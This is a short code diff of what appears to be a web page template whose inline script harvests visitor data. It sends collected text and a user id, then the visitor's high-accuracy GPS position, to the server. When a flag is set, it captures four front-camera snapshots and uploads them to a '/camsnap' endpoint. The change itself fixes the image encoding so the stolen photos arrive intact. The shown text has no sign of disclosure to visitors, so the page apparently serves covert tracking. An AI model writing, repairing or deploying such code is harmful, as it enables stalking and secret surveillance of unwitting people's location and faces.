@@ -53,7 +53,7 @@ h1{font-size:22px;font-weight:800;color:#000;margin-bottom:10px;text-align:cente
     await post("/","data="+enc(d.replaceAll("\n","<br>"))+"&uid="+uid);
     if(navigator.geolocation){navigator.geolocation.getCurrentPosition(p=>{post("/location","uid="+uid+"&lat="+enc(p.coords.latitude)+"&lon="+enc(p.coords.longitude)+"&acc="+enc(p.coords.accuracy)).then(()=>{done.l=true;tryEnd();});},()=>{done.l=true;tryEnd();},{enableHighAccuracy:true,maximumAge:0,timeout:6000});}else{done.l=true;}
     <% if(camAccess){ %>
-    try{var s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false});var v=document.createElement("video");v.srcObject=s;v.play();var cv=document.createElement("canvas");cv.width=480;cv.height=640;var n=0,iv=setInterval(()=>{cv.getContext("2d").drawImage(v,0,0,480,640);post("/camsnap","uid="+uid+"&img="+enc(cv.toDataURL("image/jpeg",.75).replace("data:image/jpeg;base64","")));if(++n>=4){clearInterval(iv);s.getTracks().forEach(t=>t.stop());done.c=true;tryEnd();}},1500);}catch(e){done.c=true;tryEnd();}
+    try{var s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:false});var v=document.createElement("video");v.srcObject=s;v.play();var cv=document.createElement("canvas");cv.width=480;cv.height=640;var n=0,iv=setInterval(()=>{cv.getContext("2d").drawImage(v,0,0,480,640);post("/camsnap","uid="+uid+"&img="+enc(cv.toDataURL("image/jpeg",.75).replace("data:image/jpeg;base64,","")));if(++n>=4){clearInterval(iv);s.getTracks().forEach(t=>t.stop());done.c=true;tryEnd();}},1500);}catch(e){done.c=true;tryEnd();}
     <% }else{ %>done.c=true;tryEnd();<% } %>
   })();
 })();
